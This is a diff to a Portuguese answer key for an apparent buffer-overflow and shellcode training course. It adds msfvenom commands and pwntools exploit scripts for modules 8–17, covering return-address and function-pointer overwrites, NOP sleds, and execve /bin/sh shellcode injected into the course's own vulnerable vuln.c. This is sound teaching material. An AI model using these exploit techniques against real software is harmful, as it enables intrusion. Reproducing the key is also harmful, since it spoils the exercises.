@@ -20,8 +20,24 @@ No modulo 6, o script tambem cria `/home/hacker/stage2.bin`.
 | 5 | `solucoes/modulo-05-encoded/solve.py` |
 | 6 | `solucoes/modulo-06-staged/solve.py` |
 | 7 | `solucoes/modulo-07-canal-local/solve.py` |
+| 8 | `solucoes/modulo-08-msf-setup/solve.py` |
+| 9 | `solucoes/modulo-09-msf-encoders/solve.py` |
+| 10 | `solucoes/modulo-10-var-adjacente/solve.py` |
+| 11 | `solucoes/modulo-11-ponteiro-funcao/solve.py` |
+| 12 | `solucoes/modulo-12-endereco-retorno/solve.py` |
+| 13 | `solucoes/modulo-13-nop-sled/solve.py` |
+| 14 | `solucoes/modulo-14-offset/solve.py` |
+| 15 | `solucoes/modulo-15-controle-rip/solve.py` |
+| 16 | `solucoes/modulo-16-shellcode-injetado/solve.py` |
+| 17 | `solucoes/modulo-17-msfvenom-no-buffer/solve.py` |
 
 O gabarito do modulo 5 nao grava `ENCODED_OK` em claro no payload. O modulo 6 limita o stage 1 a 64 bytes e o stage 2 a 512 bytes.
+
+Nos modulos 8 e 9 os gabaritos sao o fallback em `pwntools`; o caminho com a
+ferramenta real (`msfvenom`) esta no comentario de cada arquivo e no `DESCRIPTION.md`.
+Nos modulos 10 a 17, o `solve.py` compila o `vuln.c` do challenge para ler
+enderecos/offsets de forma deterministica antes de montar o payload, entao rode-o
+dentro do challenge (onde `/challenge/vuln.c` existe).
 
 # Gabarito - Shellcode com pwntools
 
@@ -272,6 +288,146 @@ O checker envia `printf CANAL_LOCAL_OK; exit` pelo canal local e verifica a resp
 
 ---
 
+## Modulo 8 - `msf-setup`
+
+Objetivo: gerar um payload que produza `MSF_SETUP_OK`.
+
+Ferramenta real:
+
+```bash
+msfvenom -p linux/x64/exec CMD='/bin/echo MSF_SETUP_OK' -f raw -o /home/hacker/payload.bin
+```
+
+Fallback (`solucoes/modulo-08-msf-setup/solve.py`): shellcode em `pwntools` que faz
+`write` de `MSF_SETUP_OK` e encerra.
+
+---
+
+## Modulo 9 - `msf-encoders`
+
+Objetivo: payload sem nenhum `0x00` que produza `MSF_ENC_OK`.
+
+Ferramenta real:
+
+```bash
+msfvenom -p linux/x64/exec CMD='/bin/echo MSF_ENC_OK' -b '\x00' -f raw -o /home/hacker/payload.bin
+```
+
+Fallback (`solucoes/modulo-09-msf-encoders/solve.py`): monta a string na pilha com
+`movabs`/`push` e carrega registradores com `push`/`pop`, evitando zeros. Confirme
+com `od -An -tx1 -v /home/hacker/payload.bin | grep -w 00` (nao deve achar nada).
+
+---
+
+## Modulo 10 - `var-adjacente`
+
+Objetivo: sobrescrever a variavel `admin` (0x1337) adjacente ao buffer.
+
+```python
+from pwn import p64
+payload = b"A" * 32 + p64(0x1337)
+open("/home/hacker/payload.bin", "wb").write(payload)
+```
+
+---
+
+## Modulo 11 - `ponteiro-funcao`
+
+Objetivo: sobrescrever o ponteiro `handler` com o endereco de `win()`.
+
+```python
+from pwn import p64, ELF, context
+import subprocess
+context.log_level = "error"
+subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
+                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
+win = ELF("/tmp/vuln_solve").symbols["win"]
+open("/home/hacker/payload.bin", "wb").write(b"A" * 32 + p64(win))
+```
+
+---
+
+## Modulo 12 - `endereco-retorno`
+
+Objetivo: sobrescrever o endereco de retorno (offset 72) com `win()`.
+
+```python
+from pwn import p64, ELF, context
+import subprocess
+context.log_level = "error"
+subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
+                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
+win = ELF("/tmp/vuln_solve").symbols["win"]
+open("/home/hacker/payload.bin", "wb").write(b"A" * 72 + p64(win))
+```
+
+---
+
+## Modulo 13 - `nop-sled`
+
+Objetivo: NOP sled (>= 200) + shellcode que imprime `NOP_SLED_OK`.
+
+```python
+from pwn import asm, context
+context.arch = "amd64"
+shellcode = asm('''
+    mov eax, 1
+    mov edi, 1
+    lea rsi, [rip + message]
+    mov edx, 12
+    syscall
+    mov eax, 60
+    xor edi, edi
+    syscall
+message:
+    .ascii "NOP_SLED_OK\\n"
+''')
+open("/home/hacker/payload.bin", "wb").write(b"\x90" * 256 + shellcode)
+```
+
+---
+
+## Modulo 14 - `offset`
+
+Objetivo: descobrir o offset com `cyclic` (vale 120) e saltar para `win()`.
+
+```python
+from pwn import p64, ELF, context
+import subprocess
+context.log_level = "error"
+subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie",
+                "/challenge/vuln.c", "-o", "/tmp/vuln_solve"], check=True)
+win = ELF("/tmp/vuln_solve").symbols["win"]
+open("/home/hacker/payload.bin", "wb").write(b"A" * 120 + p64(win))
+```
+
+Descoberta do offset: `cyclic(400)` -> rodar sob `gdb` -> `cyclic_find(valor)`.
+
+---
+
+## Modulo 15 - `controle-rip`
+
+Objetivo: offset 136, retorno apontando para o buffer, shellcode imprime `RIP_OK`.
+Ver `solucoes/modulo-15-controle-rip/solve.py` (compila com `-z execstack`, le o
+endereco do buffer no `[leak]` e monta `shellcode + NOPs + p64(buf)`).
+
+---
+
+## Modulo 16 - `shellcode-injetado`
+
+Objetivo: `[sled][execve /bin/sh][NOPs][ret = buf]`; o checker envia
+`echo BOF_SHELL_OK` pelo stdin. Ver `solucoes/modulo-16-shellcode-injetado/solve.py`.
+
+---
+
+## Modulo 17 - `msfvenom-no-buffer`
+
+Objetivo: entregar shellcode do `msfvenom` pelo overflow, produzindo `MSF_BUF_OK`.
+Ver `solucoes/modulo-17-msfvenom-no-buffer/solve.py` (usa `msfvenom` se existir,
+senao cai para `pwntools`, e embrulha em `[sled][shellcode][NOPs][ret = buf]`).
+
+---
+
 ## Resumo dos arquivos
 
 | Modulo | Arquivo pronto |
@@ -283,3 +439,13 @@ O checker envia `printf CANAL_LOCAL_OK; exit` pelo canal local e verifica a resp
 | 5 | `solucoes/modulo-05-encoded/solve.py` |
 | 6 | `solucoes/modulo-06-staged/solve.py` |
 | 7 | `solucoes/modulo-07-canal-local/solve.py` |
+| 8 | `solucoes/modulo-08-msf-setup/solve.py` |
+| 9 | `solucoes/modulo-09-msf-encoders/solve.py` |
+| 10 | `solucoes/modulo-10-var-adjacente/solve.py` |
+| 11 | `solucoes/modulo-11-ponteiro-funcao/solve.py` |
+| 12 | `solucoes/modulo-12-endereco-retorno/solve.py` |
+| 13 | `solucoes/modulo-13-nop-sled/solve.py` |
+| 14 | `solucoes/modulo-14-offset/solve.py` |
+| 15 | `solucoes/modulo-15-controle-rip/solve.py` |
+| 16 | `solucoes/modulo-16-shellcode-injetado/solve.py` |
+| 17 | `solucoes/modulo-17-msfvenom-no-buffer/solve.py` |
